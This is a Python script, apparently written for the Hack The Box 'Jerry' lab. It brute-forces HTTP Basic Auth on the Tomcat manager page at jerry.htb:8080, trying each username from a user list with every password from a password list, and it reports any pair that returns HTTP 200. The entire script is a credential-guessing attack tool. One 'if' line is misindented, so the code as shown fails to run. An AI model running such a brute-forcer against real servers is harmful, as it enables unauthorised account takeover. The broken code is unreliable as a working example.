from tqdm import tqdm
import requests
from requests.auth import HTTPBasicAuth
from time import sleep
from colorama import Fore, init
init()

# User Creds
# username = 'tomcat'
# password = 's3cret'
user = ''
password = ''
# Successflag
successflag = False
notfound = False

# Get passcount
with open('passlist', 'r') as pl:
    passcount = sum(1 for line in pl)

# Iterate lists
with open('userlist', 'r') as f:
    for user in f:
        if successflag == True or notfound == True:
            break
        user = user.strip()
        with open('passlist', 'r') as p:
            for password in tqdm(p, desc= Fore.YELLOW + f'Testing {user}', total=passcount):
                password = password.strip()                           
                response = requests.get('http://jerry.htb:8080/manager', auth = HTTPBasicAuth(user,password))  
                print(response.status_code)                          
                if response.status_code == 200:
                    print(Fore.LIGHTCYAN_EX + f'\n\n[+] Success! User:{user} Password:{password}\n\n')
                    successflag = True
                    break
                # if response.status_code == 401:
                #     print(Fore.RED + '[-] Invalid password')
                 if response.status_code == 404:
                    print(Fore.YELLOW + '[-] Page not found')
                    notfound = True
                    break

        


# Request
#response = requests.get('http://jerry.htb:8080/manager', auth = HTTPBasicAuth(user,password))


# else:
#     print(Fore.LIGHTRED_EX + f"[-] Something went wrong {response}")